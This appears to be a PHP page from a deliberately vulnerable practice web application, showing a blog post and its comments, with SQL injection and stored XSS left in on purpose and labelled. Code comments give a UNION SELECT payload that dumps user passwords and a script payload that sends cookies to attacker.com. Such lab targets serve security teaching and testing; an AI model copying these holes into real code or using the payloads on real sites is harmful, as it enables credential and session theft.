<?php
require_once __DIR__ . '/db.php';
$db = get_db();

$id = $_GET['id'] ?? '1';

// VULN #2: SQL Injection — id not sanitized
// Payload: 1 UNION SELECT username,password,email,role,bio,created_at,id FROM users--
$post = $db->query("SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.id = $id")->fetch(PDO::FETCH_ASSOC);
if (!$post) { http_response_code(404); die('Post not found'); }

// Handle comment submission
$comment_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $author = $_POST['author'] ?? 'Anonymous';
    $body   = $_POST['comment'];

    // VULN #3: Stored XSS — comment body stored and echoed without escaping
    // Payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>
    $db->exec("INSERT INTO comments (post_id, author, body) VALUES ($id, '$author', '$body')");
    header("Location: post.php?id=$id");
    exit;
}

$comments = $db->query("SELECT * FROM comments WHERE post_id = $id ORDER BY created_at ASC")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($post['title']) ?> · <?= APP_NAME ?></title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
<?php include __DIR__ . '/partials/nav.php'; ?>
<div class="container">
    <div class="card">
        <h2><?= htmlspecialchars($post['title']) ?></h2>
        <div class="meta">By <?= htmlspecialchars($post['username']) ?> · <?= $post['created_at'] ?></div>
        <div class="post-body"><?= htmlspecialchars($post['body']) ?></div>
    </div>

    <div class="card">
        <h2>Comments (<?= count($comments) ?>)</h2>
        <?php foreach ($comments as $c): ?>
        <div class="comment">
            <div class="author"><?= htmlspecialchars($c['author']) ?></div>
            <!-- vuln: body echoed raw, enables stored XSS -->
            <div class="body"><?= $c['body'] ?></div>
            <div class="meta"><?= $c['created_at'] ?></div>
        </div>
        <?php endforeach; ?>

        <form method="post" style="margin-top:1.2rem">
            <label>Your name</label>
            <input type="text" name="author" value="<?= htmlspecialchars($_SESSION['username'] ?? '') ?>">
            <label>Comment</label>
            <textarea name="comment" required></textarea>
            <button class="btn btn-primary">Post comment</button>
        </form>
    </div>
</div>
</body>
</html>
